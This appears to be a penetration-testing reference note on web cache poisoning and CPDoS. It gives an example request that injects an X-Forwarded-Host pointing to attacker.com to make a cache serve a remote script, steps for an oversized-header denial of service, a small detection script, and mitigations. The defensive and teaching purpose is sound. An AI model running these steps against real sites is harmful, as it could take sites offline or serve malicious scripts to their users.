# Web Cache Poisoning & CPDoS

**Tags:** #high #critical #cache-poisoning #cpdos #http-headers
**OWASP:** A05:2021 Security Misconfiguration
**CVSS Base:** 7.2 (High) — 9.3 (Critical if leading to XSS for all users)

---

## 📖 What it is

**Web Cache Poisoning:** An attacker sends a request that causes the web cache (CDN, Varnish, Nginx) to store a malicious response and serve it to other users.
**CPDoS (Cache-rePlying Denial of Service):** A variant where the attacker poisons the cache with an error page (e.g., 400 Bad Request), effectively taking the site down for all users served by that cache.

---

## 🔍 `grep_search` Tactics

```
X-Forwarded-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
Vary:
Cache-Control:
max-age=
s-maxage=
proxy_cache
```

---

## 💣 Attack Category 1: Unkeyed Header Injection

**How it works:** The cache uses certain parts of the request (the "cache key", usually Host + URL) to decide if it has a stored response. Many headers are "unkeyed" (ignored by the cache key) but used by the application to generate the response.

**Attack:**
```http
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

--- Response (Cached) ---
HTTP/1.1 200 OK
...
<script src="https://attacker.com/evil.js"></script>
```

**Impact:** All users visiting `target.com/page` now receive the script from `attacker.com`.

---

## 💣 Attack Category 2: CPDoS (Header Size Limit)

**How it works:** Some intermediate caches allow larger headers than the origin server.
**Attack:**
1. Send a request with a massive header (e.g., `X-Oversized: AAAAA...` 8KB).
2. The CDN passes it to the Origin.
3. Origin returns `400 Bad Request` because the header is too large.
4. CDN caches the `400 Bad Request` response.
5. **Result:** The page is now a 400 error for everyone.

---

## 💣 Attack Category 3: Cache-Key Normalization Errors

**How it works:** The cache and the origin normalize URLs differently (e.g., handling of `//` or `%2f`).
**Attack:** Poison `/index.php` by sending a request to `/index.php//` if the cache treats them as the same but the origin doesn't.

---

## 🧪 Detection Script

```python
# .tmp/test_cache_poisoning.py
import requests

TARGET = "https://target.com/"
CROP_HEADER = {"X-Forwarded-Host": "shiva-audit-test.com"}

# 1. Send request with potential poisoning header
r1 = requests.get(TARGET, headers=CROP_HEADER)

# 2. Wait a second
import time
time.sleep(1)

# 3. Send clean request to see if it's poisoned
r2 = requests.get(TARGET)

if "shiva-audit-test.com" in r2.text:
    print("[CRITICAL] Web Cache Poisoning confirmed!")
```

---

## 🛡️ Fix

1. **Avoid Unkeyed Headers:** Do not use `X-Forwarded-*` headers to generate dynamic content in cached responses.
2. **Key Everything:** If you must use a header for logic, ensure it is part of the CDN's cache key.
3. **Disable Cache for Errors:** Configure the CDN to never cache 4xx or 5xx responses.
4. **Vary Header:** Use `Vary: User-Agent, X-Forwarded-Host` to separate cache entries.

---

## 🔗 Chain Exploits

```
Cache Poisoning + Reflected XSS ➔ Stored XSS for all users
Cache Poisoning + Open Redirect ➔ Massive phishing/redirect campaign
CPDoS ➔ Full site outage via a single request
```
